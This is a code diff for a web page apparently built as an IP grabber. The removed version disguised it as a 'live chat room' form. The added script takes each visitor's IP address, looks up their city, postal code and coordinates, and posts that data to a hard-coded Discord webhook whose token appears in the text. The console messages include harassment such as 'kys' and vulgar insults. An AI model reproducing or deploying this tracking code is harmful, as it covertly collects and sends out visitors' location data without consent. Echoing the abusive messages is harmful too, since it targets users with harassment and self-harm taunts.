@@ -85,8 +85,8 @@
   </a>
   
   <form id="ipLoggerForm">
-    <input type="text" id="ipAddress" placeholder="live chat room">
-    <button type="submit">chat room</button>
+    <input type="text" id="ipAddress" placeholder="Enter your IP address">
+    <button type="submit">Log IP</button>
   </form>
   
   <script>
@@ -112,24 +112,42 @@
         .then(response => response.json())
         .then(data => {
           const ipAddress = data.ip;
-          // Send the IP address to a Discord webhook
-          const webhookUrl = 'https://discord.com/api/webhooks/1274939188885585961/C9ioDY1Sdxxt2V_qSLMYXiva1qC0QWUjPaso3me_5w32i7korzqeM3QviK7d-Nx1Odx-';
-          const payload = {
-            content: `New IP address logged: ${ipAddress}`
-          };
-          fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-          })
-            .then(response => {
-              if (response.ok) {
-                console.log('big yay');
-              } else {
-                console.error('HERES MY ADDRESS 123 PP STREAT BAKERSVAGINA CANIDA');
-              }
+          // Retrieve additional information about the IP address
+          fetch(`https://ipapi.co/${ipAddress}/json/`)
+            .then(response => response.json())
+            .then(data => {
+              const ipInfo = `
+                IP Address: ${ipAddress}
+                Country: ${data.country_name}
+                Region: ${data.region}
+                City: ${data.city}
+                Timezone: ${data.timezone}
+                Postal Code: ${data.postal}
+                Latitude: ${data.latitude}
+                Longitude: ${data.longitude}
+              `;
+              // Send the IP information to a Discord webhook
+              const webhookUrl = 'https://discord.com/api/webhooks/1274939188885585961/C9ioDY1Sdxxt2V_qSLMYXiva1qC0QWUjPaso3me_5w32i7korzqeM3QviK7d-Nx1Odx-';
+              const payload = {
+                content: `New IP address logged:\n${ipInfo}`
+              };
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+              })
+                .then(response => {
+                  if (response.ok) {
+                    console.log('IM WATCHING');
+                  } else {
+                    console.error('i just shit on your grandma');
+                  }
+                })
+                .catch(error => {
+                  console.error('big yay:', error);
+                });
             })
             .catch(error => {
               console.error('kys:', error);
